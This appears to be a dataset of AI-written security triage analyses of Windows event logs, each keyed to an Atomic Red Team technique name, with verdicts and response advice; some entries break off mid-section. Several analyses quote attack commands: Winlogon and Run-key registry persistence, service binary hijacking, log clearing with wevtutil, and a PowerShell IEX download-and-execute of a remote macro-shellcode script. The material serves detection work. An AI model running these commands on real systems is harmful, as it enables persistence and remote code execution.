   - The logs show the execution of `Set-ADAccountPassword`, suggesting that there might be an attempt to elevate privileges or modify user account credentials, potentially unauthorised.

4. **Use of Administrative Tools:**
   - The frequent use of `wevtutil.exe` and `powershell.exe` under the `admin_test` account in quick succession raises alarms about possible execution of administrative tools to modify system logs and settings, often associated with post-exploitation activities.

5. **Process Execution and New Processes:**
   - Several entries show execution of system utilities like `wevtutil`, `conhost`, and PowerShell with elevated privileges which suggests administrative-level task handling by `admin_test` around the same timeframe.

### Assessment

- **Threat Identification**: The series of actions (log clearance via `wevtutil.exe`, PowerShell scripts for credential management, etc.) executed under the `admin_test` account on `Server002` are highly indicative of attempts to cover tracks and maintain persistence. Such behaviors align with typical tactics employed in compromised environments.

- **Risk**: The apparent use of red teaming tools shown in the logs, if not authorized as part of a security exercise, presents a severe risk of system compromise. Moreover, if this activity is unrelated to an internal security team operation, then the risk factor increases substantially due to misuse of TTPs (tactics, techniques, and procedures) by potential attackers.

### Resolution

- **Resolution**: The activity logged suggests a deliberate attempt to clear evidence and manipulate credentials. Given the manual intervention and use of capability camouflage, the activity captured should be marked as:

  - **MALICIOUS**

### Recommendations

1. **Immediate Investigation**: 
   - Perform an immediate forensic investigation to determine the nature and source of this activity.
   - Confirm whether the actions were part of an internal security drill or unauthorized activity.

2. **Account Revocation**:
   - Suspend the `admin_test` account and review all actions performed by this account.

3. **Review Audit Policies**:
   - Implement enhanced logging and monitoring to detect similar activities earlier.
   - Reinstate and protect cleared log files to ensure no further incidents go unnoticed.

4. **Security Awareness and Protocols**:
   - If this is a red team exercise, correlate findings with planned activities and document learnings.
   - Strengthen security training for staff to avoid confusion over such activities.

By addressing these points, you can mitigate the identified risks and bolster your security posture against potential threats."
Parent PID Spoofing - Spawn from New Process,"Upon reviewing the provided Windows event logs, we identify several areas of concern:

1. **Log Clearance**: There's evidence suggesting logs were cleared around the same time across different channels—System, Security, and Windows PowerShell—by the user ""admin_test"". This is indicated by the event with EventID 1102 in the Security log and EventIDs 104 in the System log. Clearing logs, especially by an admin account, is typically a red flag, as attackers often do this to cover their tracks.

2. **Execution of Wevtutil.exe**: The logs show multiple instances of `wevtutil.exe` command being executed from locations within `System32`, specifically using commands like `cl Microsoft-Windows-Sysmon/Operational`, which are consistent with log clearing operations. This tool is commonly used to clear event logs, further confirming the suspicious nature of the log clearances.

3. **Suspicious PowerShell Activity**: The PowerShell logs display unusual command execution patterns including the spawning of processes using `Start-Process`, specifically targeting `notepad.exe` and attempting to use a potentially non-standard cmdlet `Start-ATHProcessUnderSpecificParent`. This could indicate an attempt to execute anonymous or stealthy processes with elevated permissions or obfuscate the actual process run.

4. **Executed Commands**: The logs show executions of `hostname.exe` and `whoami.exe`, typical utilities that a user might employ to gather information on the system or logged-in user. While on their own they are not unusual, in conjunction with other suspicious activities, they may suggest reconnaissance steps undertaken by an attacker.

Given these findings, particularly the log clearance actions and the PowerShell command execution attempting to elevate potentially malicious processes or actions, the activity appears suspicious and indicative of attempted or successful unauthorized actions on the system.

**Assessment and Resolution**: 
- **SUSPICIOUS**: The logs contain activity that doesn't look right and warrants further investigation. While we do not have enough evidence of outright malicious software or files, the behavior (such as log clearing and unusual PowerShell command usage) is suspicious and should be investigated thoroughly to determine whether malicious actions were undertaken or if there’s an ongoing threat.

**Guidance**:
1. **Immediate Actions**:
   - Ensure that the machine (Server002) is isolated from the network to prevent potential further compromise.
   - Collect and preserve all relevant forensic data for deeper analysis, including full memory dumps and any available disk images.
   - Change passwords for user ""admin_test"" and review all user access and permissions on the affected system.

2. **Further Investigation**:
   - Conduct a thorough investigation into any lateral movements or access to sensitive corporate data by reviewing network logs and other endpoints.
   - Analyze any scripts or files that have been recently modified or accessed, with special attention to the PowerShell execution path and any unexpected cmdlets or custom scripts.
   - Employ EDR solutions to scan for potential indicators of compromise across the network, focusing on systems with similar configurations or actions.

3. **Implement Monitoring**:
   - Set up enhanced monitoring for PowerShell activities, log clearance actions, and the use of administrative tools such as wevtutil on high-value targets within the organization, ensuring such events trigger alerts in the future."
Winlogon Notify Key Logon Persistence - PowerShell,"The provided log entries reveal activities that raise multiple concerns and suggest potential malicious activity on the host ""Server002."" Here's a detailed analysis outlining the key suspicious behaviors. 

### 1. **Windows PowerShell Log Analysis:**

- **Command Execution:** The command executed through PowerShell involves creating registry entries related to the `Winlogon` notification package. Specifically:
  ```powershell
  New-Item ""HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\\AtomicRedTeam"" -Force
  Set-ItemProperty ""HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\\AtomicRedTeam"" ""DllName"" ""C:\\Windows\\Temp\\atomicNotificationPackage.dll"" -Type ExpandString -Force
  ```
  - The registry key modifications involve a DLL to be triggered with logon events, which is a common persistence mechanism used by malware.

### 2. **Security Log Analysis:**

- **Event Log Clearing:**
  - **Event ID 1102:** This indicates that the security log was cleared by the user `admin_test`. This event is highly suspicious as log file clearing is often used to cover tracks after malicious activity.

- **Time Change:**
  - **Event ID 4616:** This shows that the system time was altered, which could be another attempt to evade detection mechanisms or logs synchronization for a malicious purpose.

### 3. **Sysmon Log Analysis:**

- **Event Log Clearing Command:**
  - **wevtutil.exe:** Multiple instances where `wevtutil.exe` was executed with the `cl` (clear) option on different logs such as Sysmon, Application, and Security. This indicates an attempt by `admin_test` to clear logs which is typically used to hide malicious activities.

### 4. **System Log Analysis:**

- **Log Clearing Attempt from a Different Source:**
  - The log clearing by `admin_test` persists across different log types, not limited to the security logs alone, indicating a coordinated effort to obscure actions on the system.

### 5. **Overall Assessment:**

The combination of registry modifications to establish persistence, clearing of multiple event logs, and the synchronization of these events paint a concerning picture. The timing of the PowerShell script execution and subsequent log clearing is indicative of an attempt to deploy and obfuscate malicious capabilities on the system. Furthermore, the consistent use of high-integrity processes to conduct these activities suggests an exploitation of elevated privileges, likely gained through some other means.

### Conclusion:

Based on the analysis, the activities detailed in the logs are consistent with tactics used in malware deployment and attempts to maintain persistence while erasing potential evidence. Therefore, I classify these findings as:

- **MALICIOUS**

### Guidance on How to Proceed:

1. **Immediate Containment:**
   - Isolate `Server002` from the network to prevent any potential lateral movement or further compromise.
   
2. **Full Malware Investigation:**
   - Deploy in-depth forensic analysis on the system to identify any installed malware or additional compromise points.
   
3. **User Account Review:**
   - Investigate the `admin_test` account for unauthorized access or signs of compromise.
   - Consider reviewing all administrative accounts for similar suspicious activities.

4. **System and Network Monitoring:**
   - Enhance monitoring of similar systems and scrutinize network traffic for potential indicators of compromise across the infrastructure.

5. **Assess and Improve Security Posture:**
   - Revise and reinforce policies concerning log monitoring and clearing access.
   - Evaluate the current endpoint detection and response (EDR) configurations and rules to capture similar activities better.

Considering these logs, it is critical to take decisive action promptly to contain and mitigate the foreseen risks."
Simulate - Post BEC persistence via user password reset followed by user added to company administrator role,"Based on the analysis of the provided Windows event logs, several indicators suggest potentially malicious activity on the host ""Server002"":

1. **Log File Clearing**: Multiple logs have been cleared around the same time (`EventID 104 in System log` and `EventID 1102 in Security log`). The `wevtutil.exe` command is used to clear logs, which is reflected in the Sysmon entries for the processes started by `admin_test`. This behavior is often indicative of an attempt to cover tracks following unauthorized activity.

2. **Suspicious PowerShell Execution**: There is a PowerShell script logged that imports MSOnline and AzureAD modules, resets a user's password, and assigns high-privilege roles (`Company Administrator` and `Global Reader`) to a user with the email address ""default"". Such operations typically require administrative privileges and are used for privilege escalation or maintaining persistence within a network.

   - The PowerShell log entries (`EventID 600`) contain details of activities that match what is known to be signature behavior in several attack frameworks.

3. **Lateral Movement Indicators**: The usage of `wevtutil.exe` to clear logs combined with suspicious PowerShell scripts suggests a potential stage of lateral movement within the network. The presence of administrative tasks and role assignments points toward an intent to solidify control over compromised accounts.

4. **Execution of System and User Enumeration**: Execution of commands such as `whoami.exe` and `hostname.exe`, though not inherently malicious, can indicate reconnaissance objectives typical in attack sequences.

Considering the observed behaviors and the potential high-risk actions, the activity can be concluded as **MALICIOUS**.

**Assessment** and **Recommendations**:
- Immediate isolation of the affected system ""Server002"" to prevent further potential compromise within the network.
- Conduct a full forensic investigation to trace the entry vector, understand the scope, and contain the intruder.
- Change credentials of impacted or potentially compromised accounts, especially those with elevated privileges.
- Review and enhance logging and monitoring on other critical systems to detect similar activity promptly.
- Inform executive management and IT teams to prepare for corrective actions and lessen the impact of the breach."
Modify Service to Run Arbitrary Binary (Powershell),"After an in-depth analysis of the provided Windows event logs, several indicators of unusual and potentially malicious activity have been identified. Here's a detailed analysis:

### Suspicious or Anomalous Behavior:

1. **PowerShell Events:**
   - The PowerShell logs show a script executed on `Server002` which modifies the binary path of the `fax` service. The PowerShell command stops the `fax` service, changes its executable to `notepad.exe`, and then restarts the service. This behavior is highly indicative of a service hijacking attempt, potentially to escalate privileges or execute arbitrary code as a system service.

2. **Event Log Clearing:**
   - The System and Security event logs have been cleared by the user `admin_test`. This is captured by Event ID `1102` in the Security log and multiple Event ID `104` logs in the System log, showing that logs for various channels including Sysmon and PowerShell were cleared. Clearing log files is a tactic often used by attackers to cover their tracks after engaging in suspicious or malicious activity.

3. **Suspicious Processes and Command Line Executions:**
   - The `Sysmon` logs indicate the use of `wevtutil.exe` to clear event logs programmatically. The logs reflect the use of high privilege for clearing logs (`admin_test` with a high integrity level), matching the ID used to clear logs.
   - The command-line activity involving `wevtutil.exe` and PowerShell commands seem to be coordinated with the above-mentioned activities.

4. **Service Modification:**
   - The Application logs indicate activities related to the `Fax` service that align temporally with the PowerShell events. The modification of a service's executable path is a common technique used for persistence or privilege escalation.

5. **Time Discrepancies:**
   - A time change was recorded (Security Event ID `4616`), although there doesn't appear to be any specific indication that this was done maliciously, it occurred very close to other suspicious events and could potentially be related to attempts to manipulate log timestamps.

### Assessment of the Situation:
The combination of service modification through PowerShell, clearing of event logs, and execution of potentially suspicious tools like `wevtutil.exe` for clearing logs without further documentation to support benign usage heavily suggests potentially malicious activity or a compromise of the system.

### Identified Threats or Risks:
- **Privilege Escalation:** The modification of service binaries could allow escalation of privileges, especially if system services are exploited.
- **Persistence:** Modifying the service path can be a mechanism for maintaining persistence on the machine.
- **Data Integrity Risks:** Clearing logs to cover tracks poses a significant threat to data integrity and the ability to correlate chronological event sequences effectively.

### Guidance on How to Proceed:
1. **Immediate Containment:**
   - Isolate `Server002` from the network to prevent potential lateral movement or further exploitation.
   
2. **Investigation and Forensics:**
   - Conduct a detailed forensic investigation to determine the scope of the compromise.
   - Recover cleared logs using backups or shadow copies if available, to aid in identifying the full sequence of malicious actions.

3. **Review and Revert Changes:**
   - Revert any unauthorized changes to service configurations and ensure the integrity of all system services.
   
4. **User Account Security:**
   - Investigate the `admin_test` account for unauthorized access or compromise.
   - Reset credentials and review permissions.

5. **Strengthen Monitoring:**
   - Enhance monitoring policies to detect similar PowerShell activities, service changes, and log file clearances in the future.

### Final Resolution: MALICIOUS

The analysis concludes with certainty that the logs exhibit malicious activities involving potential exploitation of the `fax` service for malicious purposes, coupled with the systematic clearing of event logs to obfuscate malicious actions. Immediate containment and detailed forensic analysis are recommended."
Import XML Schedule Task with Hidden Attribute,"**Detailed Analysis:**

1. **Log Clear Events:**
   - The security, system, and PowerShell logs have entries indicating they were cleared by the user ""admin_test"" on ""SERVER002."" This is evidenced by Security Event ID 1102 and System Event ID 104. The clearing of logs, especially without proper documentation or communication, is a red flag for potential malicious activity as it might be an attempt to cover tracks.

2. **PowerShell Activity:**
   - The PowerShell script execution using a command (`powershell.exe & ...`) initiating a scheduled task registration through the `RegisterByXml` method with `Invoke-CimMethod` is suspicious. Additionally, the presence of a path indicating the use of the Atomic Red Team's T1053.005 technique in the script suggests the simulation or execution of a Scheduled Task/Job, which could be used for persistence by attackers.

3. **Sysmon Logs:**
   - Multiple events of `wevtutil.exe` being used to clear logs (command: `\""C:\\Windows\\system32\\wevtutil.exe\"" cl`) in security, application, and system logs align with the log clearing events observed. This reinforces the theory of an attempt to tamper with logging for obfuscating activities.
   - The use of standard system utilities like `whoami.exe`, `hostname.exe`, and PowerShell in sequence can indicate reconnaissance activities often seen in attack scenarios.

4. **Network and System Tasks:**
   - Observations of `MicrosoftEdgeUpdate`, `sppsvc.exe`, and `wbem\\WmiPrvSE.exe` processes appear as routine system updates and service activities under the NT AUTHORITY accounts, showing no immediate malicious intent.

5. **Indicators of Malicious Activity:**
   - The combination of clearing security logs, suspicious PowerShell execution, potential use of Atomic Red Team for simulating or executing attacks, and the unauthorized use of `wevtutil.exe` suggests malicious intent.

**Assessment:**
- When logs, especially critical ones like Security and System logs, are cleared without justifiable cause and in conjunction with complex PowerShell scripts intended to register tasks covertly, it suggests a high likelihood of malicious activity aimed at maintaining persistence or conducting unauthorized actions without detection.

**Resolution:**
- **MALICIOUS**

**Guidance on How to Proceed:**
1. **Immediate Containment:**
   - Isolate the affected host (Server002) from the network to prevent further potential damage or lateral movement.

2. **Forensic Analysis:**
   - Perform a comprehensive forensic analysis on the machine to identify and understand the full extent of the compromise.
   - Recover the cleared logs if possible by checking previous log file backups or replication servers.

3. **Investigate User Accounts:**
   - Verify the account ""admin_test"" activity, check for any unauthorized privilege escalations or unusual activities leading up to this event.

4. **Patch Management:**
   - Ensure the system and all utilities (especially PowerShell) are updated to the latest security patches.

5. **Enhanced Monitoring:**
   - Implement stricter monitoring and alerting for log clearing activities, PowerShell script executions, and changes in scheduled tasks.

6. **Review Security Policies:**
   - Review and tighten security policies related to log access, PowerShell usage, and scheduling tasks.
"
Shortcut Modification,"Upon reviewing the provided Windows event logs, there are several behaviors and events that raise concerns:

1. **Event Log Clearing:** 
   - The security log (EventID 1102) and system log (EventID 104) indicate log file clearing events. The presence of these first signals unusual activity, particularly when accompanied by potentially suspicious actions around the same timestamps.
   - The user associated with these actions is ""admin_test"", implying administrative privileges were used to clear logs.

2. **Time Manipulation:**
   - There are several `EventID 4616` entries indicating time changes on the system. Manipulating the system time can be a tactic used by malicious actors to either evade detection or alter timestamps related to malicious activities.

3. **Abnormal Process Activity:**
   - The use of the `cmd.exe` to create and execute shortcuts (EventID 1), with a specific command-line argument which resembles a potential persistence mechanism involving a modified shortcut that points to `calc.exe`. This is indicative of malicious behavior aimed at maintaining presence on the system.

4. **High Integrity Level Execution:**
   - Multiple instances of processes (`whoami.exe`, `hostname.exe`, `wevtutil.exe`, etc.) executed under a high integrity level context using an administrative account are captured, which could be standard in some cases. However, the associated actions and clearing of event logs heighten suspiciousness.

5. **Use of `wevtutil.exe`:**
   - The execution of `wevtutil.exe` commands to clear logs related to specific channels like Security, Application, and Sysmon might be an attempt to cover tracks, which is characteristic of an adversary aiming to evade detection.

6. **Edge Update Activities:**
   - There is extensive logging of Microsoft Edge Update activities which on the surface may seem benign. However, the timing and sequence suggest it might serve as cover or distraction amid activities that are more suspect in nature.

7. **Sequence and Timing of Events:**
   - The timeline shows a rapid sequence of event log clearance (`EventID 104` and `EventID 1102`), unusual time adjustments (`EventID 4616`), and potential persistence-related activities happening almost simultaneously.

Based on the analysis of logs, the series of events — intentional log clearing, suspicious process executions, and time alterations — strongly indicate unauthorized and potentially malicious activities. The behaviors mimic tactics observed during attempts to maintain persistence or evade detection post-compromise.

**Resolution: MALICIOUS**
- The activities observed are consistent with malicious actions typically associated with post-exploitation tactics. Immediate investigation and response actions should be initiated to prevent further potential harm. Consider isolating the affected machine, conducting a thorough forensic analysis, and reviewing additional security measures or configurations that may have been affected."
`SeDebugPrivilege` token duplication,"### Detailed Analysis of the Logs:

#### Notable Observations:
- **Time Manipulation Event:**
  - The security log and system log both indicate an event where the system time was changed. This is suspicious as it is often used by attackers to obscure their actions or bypass specific logging and timestamps. Event ID 4616 and 1 (Kernel-General) indicate this.

- **Event Log Clearing:**
  - Security and System logs have Event ID 1102 and 104 respectively, indicating that logs were cleared. The subject username for these events is ""admin_test,"" suggesting that an administrative user cleared the logs. Event log clearing is a common tactic used by malicious actors to cover tracks.

- **Suspicious PowerShell Activity:**
  - There is evidence of potentially malicious PowerShell activity with the execution of a script from a GitHub repository known for privilege escalation (""Get-System.ps1"" from the Empire framework). Event ID 1 in the Sysmon logs recorded PowerShell running with command lines suggesting privilege escalation techniques.

- **Use of Built-in Windows Tools:**
  - The logs show repeated use of `whoami.exe`, `hostname.exe`, and `wevtutil.exe`. These tools are typically benign. However, their frequent execution, especially following PowerShell activity, may indicate reconnaissance actions typical in a compromise scenario.

- **Integrity Levels and User Context:**
  - The processes appear to run at a high integrity level under the username ""SERVER002\admin_test"", which could imply that the processes have administrative privileges. This is critical as attackers often run processes with high privileges to facilitate deeper system manipulation.

#### Threat Assessment:
Based on the captured events and associated activities, several suspicious behaviors suggest a potential compromise:
- **Obfuscation Attempts:** Time changes and log clearing indicate attempts to obscure the system's actual state and history.
- **Malicious Scripting Activity:** Execution of a PowerShell script meant for privilege escalation through a known framework points to malicious intent.
- **Pattern of Execution:** The repetitive, unusual use of system diagnostic utilities may indicate reconnaissance, a phase in the cyber attack lifecycle.

### Resolution: MALICIOUS

The combination of altered system time, event log clearing, execution of PowerShell scripts known for privilege escalation, and unusual diagnostic processes points to a high likelihood of malicious activity. It is recommended to:
- **Isolate the affected machine** to prevent further malicious activity or lateral movement.
- **Conduct a full forensic investigation** to determine the extent of the compromise.
- **Change all administrative credentials,** as they may have been compromised.
- **Inspect any PowerShell scripts** executed and their impact on the system.
- Increase monitoring on similar patterns or anomalous activities across the network."
Process Hollowing in Go using CreateProcessW WinAPI,"**Detailed Analysis of the Windows Event Logs**

**1. System Log Analysis:**
- The first two log entries in the System log indicate that the ""admin_test"" user cleared the System and Windows PowerShell logs. Clearing logs, especially those that track significant activities on the system, is a known tactic used by malicious actors to cover their tracks and avoid detection. The cleared logs indicate potential malicious activity or an attempt to hide actions taken on the system.

**2. Sysmon Log Analysis:**
- The Sysmon logs show multiple entries where `wevtutil.exe` is used by the user ""admin_test"" to clear various logs. The `wevtutil` utility is leveraged to manage Windows Event logs, and using it to clear logs is suspicious when done outside of regular log maintenance.
- The command line includes operations aimed at clearing logs and executing PowerShell scripts located in a temporary folder, utilizing `wevtutil.exe` on the PowerShell, System, Application, and Security logs. This strongly suggests an attempt to remove traces of activity.
- PowerShell usage involves executing scripts with names that resemble security experiment frameworks like ""AtomicRedTeam"" (T1055.012). While this can be benign when used for testing security controls, in conjunction with log clearing activity, it raises suspicion.

**3. Windows PowerShell Log Analysis:**
- The PowerShell logs reveal the execution of a command initiated from `powershell.exe`, with command lines indicative of exploitation frameworks or security evasion tests.
- The use of `CreateProcess.exe` to launch `werfault.exe` appears unusual, especially when combined with the `-debug` flag, indicating likely exploitation or testing behavior.

**4. Application Log Analysis:**
- The single entry in the Application log regarding the Software Protection Platform Service (SPP) does not have clear ties to malicious activity. It's a regular log entry without indicators of compromise.

**5. Security Log Analysis:**
- The security log shows that the Security log was cleared by ""admin_test,"" reinforcing suspicious behavior.
- There are multiple entries with high privilege (e.g., `SeDebugPrivilege`) logons by the ""admin_test"" user, followed by actions suggesting a desire to mask activities or gather information about active users and system processes.

**Assessment:**
- The combination of logs being cleared by an administrative user, the use of PowerShell to potentially execute suspicious commands, and the context of known exploitation test frameworks suggest that there may be an unauthorized or malicious activity occurring on the system.

**Resolution: MALICIOUS**
Given the assembly of events indicating log tampering, potentially unauthorized administrative actions, and the context indicating likely security testing or evasion activity without authorization, these logs collectively point towards malicious intent or compromise.

**Guidance:**
- Immediately secure and isolate the affected system for a thorough forensic investigation.
- Review user ""admin_test"" account activities and verify unusual or unauthorized use.
- If the activities are confirmed unauthorized, reset administrative credentials and perform a full scope investigation on other systems for similar patterns.
- Enhance logging and monitoring to prevent recurrence and improve detection of similar activities."
Winlogon HKLM Shell Key Persistence - PowerShell,"### Detailed Analysis of Logs

#### Suspicious and Anomalous Behavior:
1. **PowerShell Activity:** 
   - A PowerShell command was executed to modify the registry key responsible for what's launched at user login (`HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell`). The command `Set-ItemProperty ... Shell ""explorer.exe, C:\Windows\System32\cmd.exe"" -Force` modifies the shell to include `cmd.exe`, which is highly unusual for legitimate activity. This configuration can be indicative of an attacker's attempt to ensure persistence or execute malicious code upon login.
   
2. **Event Log Clearance:**
   - There are entries in the logs suggesting the use of `wevtutil.exe` to clear specific log files, including Application, System, and Security logs. Clearing event logs (`cl` argument) is a strong indication of an adversary attempting to cover their tracks post-compromise as it obfuscates the activities they performed during their presence on the machine.

3. **Log File Cleared Events:**
   - Multiple entries show that someone with the username `admin_test` cleared logs from System and Windows PowerShell channels. The combination of clearing logs and suspicious registry modification is a hallmark pattern of malicious activity.

4. **Persistence Mechanism Setup:**
   - The PowerShell command observed suggests setting up a persistence mechanism by altering the shell startup. This typically allows an attacker to execute commands upon user login.

#### Malicious Indicators:
- **Use of `wevtutil.exe`:** Clearing logs using `wevtutil.exe` is commonly associated with malicious activity aimed at removing traces.
- **Modification of Shell Registry Key:** Adds the invocation of `cmd.exe`, which is often associated with malicious purposes, such as spawning unwanted command prompts for command execution or scripts.
- **Administrative User (`admin_test`) Involvement:** The use of an administrative account to conduct these actions is indicative of compromised credentials or an unauthorized escalation.

### Assessment of the Situation:
Based on the evidence observed, there is significant activity indicative of a compromise. The combination of event log clearance, PowerShell abuse, and registry manipulation is a clear sign that malicious intent was involved to further unauthorized objectives on the system.

Reg Key Run,"Based on a thorough review of the provided Windows event logs, some notable points of anomaly and potentially malicious activity have been observed:

1. **Log Clearing Activity:**
   - Multiple log files were cleared by the user `admin_test`, including the `System`, `Windows PowerShell`, and `Security` event logs (`EventID 104` in System log and `EventID 1102` in Security log). The clearing of event logs without proper justification is a common practice in malicious activity to hide traces and cover tracks.

2. **Frequent Use of `wevtutil.exe`:**
   - The presence of `wevtutil.exe` used to clear logs, indicated by command lines such as `""C:\\Windows\\system32\\wevtutil.exe"" cl System` suggests systematic clearing of event logs. The actions were executed back-to-back in a short time span by the same user, `admin_test`, and the same process lineage.

3. **Registry Modification:**
   - There is a suspicious `cmd.exe` execution involving the registry addition for persistence (`REG ADD`). The key `HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` was modified to include an application ""Atomic Red Team,"" commonly known for simulating adversary tactics. This behavior is indicative of establishing persistence on the system and aligns with tactics used during post-compromise exploitation.

4. **SVCHOST and TIME Change Events:**
   - `svchost.exe` was involved in a time change event (`EventID 4616` in Security log). While time change can be benign, when combined with other suspicious activities, it could be part of a tactic to manipulate time-stamps of logs or scheduled tasks.

5. **Integrity Levels and User Details:**
   - The processes executed have high integrity levels and are under the high-privilege user account `admin_test`, suggesting potential privilege escalation or misuse of an administrative account.

Given these observations, the logs showcase a series of activities that align with common malicious behaviors, such as log manipulation, persistence establishment, and potential cover-up actions, likely pointing to a compromise.

HKLM - re-execute Internet Explorer Core Fonts' StubPath payload by decreasing version number,"Upon analyzing the provided logs, several key points of interest were noted, indicating potential security concerns.

1. **Event Log Clearing**:
   - The logs suggest that the event logs for Application, System, Windows PowerShell, and Security channels were cleared at approximately `2024-10-27 17:21:05`. This is documented by multiple `LogFileCleared` events with Event IDs being `104` (System log) and `1102` (Security log). 
   - Typically, clearing event logs might be a legitimate administrative action, but in the context of an EDR alert on the CEO's machine, it raises suspicion as adversaries often clear logs to cover their tracks.

2. **PowerShell Activity**:
   - A suspicious PowerShell script execution was recorded in which the `Set-ItemProperty` cmdlet interacted with the registry path: `HKCU:\SOFTWARE\Microsoft\Active Setup\Installed Components\{C9E9A340-D1F1-11D0-821E-444553540600}`. The script also executed `runonce.exe`.
   - The PowerShell script modifications to the registry and execution of `runonce.exe` might be indicative of a persistence mechanism or initial foothold by potentially malicious software. This calls for further investigation into why these modifications were made.

3. **Command-Line Utility Usage**:
   - There is notable use of `wevtutil.exe` to clear specific logs (`Application`, `System`, `Security`) as part of a sequence immediately before the logs were cleared, as evidenced by the series of Sysmon events (`EventID 1`) related to `wevtutil.exe`. 
   - `wevtutil.exe cl` commands are typical for clearing event logs, a behavior commonly associated with attempts to erase forensic evidence.

4. **Execution of High-Privilege Operations**:
   - Many of these processes were executed with high integrity levels, and some processes were run by `NT AUTHORITY\SYSTEM`, indicating high privilege operations. 

5. **Time Manipulation**:
   - Analysis uncovered time manipulation events in the system logs, which often indicate tampering with time to manipulate log timestamps, further bolstering the notion of malicious activity.
   
6. **Presence of Legitimate-looking Edge Update Processes**:
   - While there are numerous entries related to Microsoft Edge Update, the contextual sequence suggests these might be a smoke screen or benign in nature, though further checking against the latest threat intelligence databases for masquerading threats mimicking known processes would be prudent.

Based on these observations, the nature of the events—particularly around log clearing, potential registry persistence techniques via PowerShell, and tampering with system time—leads to the assessment that there is a strong indication of malicious activity.

**Resolution**: MALICIOUS

**Guidance**:

Shellcode execution via VBA,"### Analysis of Logs:

Upon reviewing the provided logs, several indicators suggest potential malicious activity. Key findings are:

1. **Suspicious Use of PowerShell**:
   - The logs show PowerShell executing a script from a URL (`https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1`). This script seems to be downloaded and executed via the command line in a PowerShell session, as observed from the command line used in the events:
     ```
     ""powershell.exe"" & {
       [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12, 
       IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"" -UseBasicParsing),
       Invoke-Maldoc -macroFile ""C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\T1055\src\x64\T1055-macrocode.txt"" -officeProduct ""Word"" -sub ""Execute""
     }
     ```
   - This behavior is suspicious as it involves downloading and executing a possibly malicious script from an external source without any apparent legitimate justification.

2. **Log Clearing Activities**:
   - There are multiple events indicating that logs have been cleared (Event ID 104 for System and PowerShell event logs, and Event ID 1102 for the Security log). The clearing of logs is often a tactic to cover up malicious activities:
     - System Log Cleared (`SystemTime"":""2024-10-22 17:12:58.6225000`)
     - PowerShell Log Cleared (`SystemTime"":""2024-10-22 17:12:58.9531440`)
     - Security Log Cleared (`SystemTime"":""2024-10-22 17:12:58.7936163`)

3. **High Integrity Level Processes**:
   - The logs show that the processes are running at a high integrity level, indicating they have elevated privileges. The process behavior, specifically of `wevtutil.exe` and `conhost.exe`, aligns with actions attempting to manage or manipulate logs and system settings.

### Assessment:

The combination of PowerShell being used to execute potentially harmful scripts combined with the log deletion activities points towards a methodical attempt to execute unauthorized or malicious activities while covering tracks. This activity deviates significantly from typical valid use and suggests compromise:

Azure AD - adding permission to application,"Upon reviewing the provided Windows event logs, several indicators stand out, suggesting potential malicious activity:

1. **Suspicious PowerShell Activity**:
   - There are multiple events related to the execution of PowerShell scripts that involve the AzureAD module. The scripts involve the creation and manipulation of AzureAD applications and service principals, making connections to AzureAD using credentials that were converted from a plain text password (`""p4sswd""`).
   - The command sequence appears to be setting application permissions and roles via PowerShell, which is often seen in penetration testing, red teaming exercises, or malicious activities trying to manipulate access controls or perform privilege escalation in Azure environments.

2. **Event Log Clearing**:
   - The Security log (EventID 1102) and System log (EventID 104) were cleared by the user ""admin_test"". Clearing event logs is a known tactic used by attackers to cover their tracks and evade detection.
   - The events show that `wevtutil.exe` was used to clear logs, which aligns with techniques used for log tampering and anti-forensic activity. The presence of these events within close proximity to the suspicious PowerShell activity raises a red flag. 

3. **High Integrity Execution**:
   - Many of the processes, including conhost.exe and PowerShell activities, are running at a high integrity level. This could suggest the user has elevated privileges, which, combined with the activities being performed, further raises suspicion.

4. **Frequent Executions of Command-Line Tools**:
   - There are multiple executions of tools like `wevtutil.exe`, `whoami.exe`, and `hostname.exe`. While these tools can have legitimate uses, in conjunction with the other activities observed (especially log clearing), they may form part of a reconnaissance or cleanup activity by an attacker.

**Assessment**:
The combination of unauthorized PowerShell script execution, log clearing, and elevated process execution suggests that the system may have been compromised. The PowerShell script activity in particular, involving AzureAD, could indicate an attempt to manipulate Azure resources or credentials fraudulently.

**Resolution**: MALICIOUS

**Guidance on How to Proceed**:
- Immediately isolate the affected system to prevent further suspicious activities or information theft.
- Conduct a full forensic investigation to understand the extent of the compromise, specifically focusing on the use of compromised or misused credentials.
- Review and audit AzureAD logs and configurations for unauthorized changes or access.
- Reset credentials for any accounts that could have potentially been compromised.
- Implement enhanced monitoring and alerting for similar activities in the future to prevent recurrence.
- Conduct a security awareness session for users on detecting and reporting suspicious activities."
Process Injection with Go using EtwpCreateEtwThread WinAPI,"### Detailed Analysis

1. **Clearing of Event Logs:**
   - The Windows event logs indicate that logs were cleared (`EventID 104` for System and PowerShell logs) at `2024-10-22 17:35:04` and `17:35:05` by the user `admin_test` on `Server002`.
   - The Security log was also cleared (`EventID 1102`) at `2024-10-22 17:35:05`.

2. **Abnormal PowerShell Activity:**
   - The PowerShell logs show the execution of a suspicious PowerShell command:
     ```plaintext
     powershell.exe & {C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\T1055\bin\x64\EtwpCreateEtwThread.exe -debug}
     ```
   - This command involves an executable named `EtwpCreateEtwThread.exe`, which is located in a temporary directory under the AtomicRedTeam. This naming and path are indicative of a red team tool or attack simulation framework, frequently used for penetration testing or attacking Windows Event Tracing for Windows (ETW).

3. **Use of System Utilities:**
   - There is a series of executions of `wevtutil.exe` with the `cl` (clear logs) command for various log channels (Microsoft-Windows-Sysmon, Application, System, Windows PowerShell, and Security) during the same timeframe.
   - Executions of `whoami.exe` are observed, which are tools to identify the current logged-on user and session details. This could be used by an attacker to verify privileges.

4. **Privileged Logon:**
   - The Security logs show that `admin_test` had a successful NTLM logon with elevated privileged tokens (`SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, etc.) directly before these actions with `EventID 4672` showing the privileges assigned.

### Assessment

Based on the provided logs:

- **Indicators of Potential Compromise:**
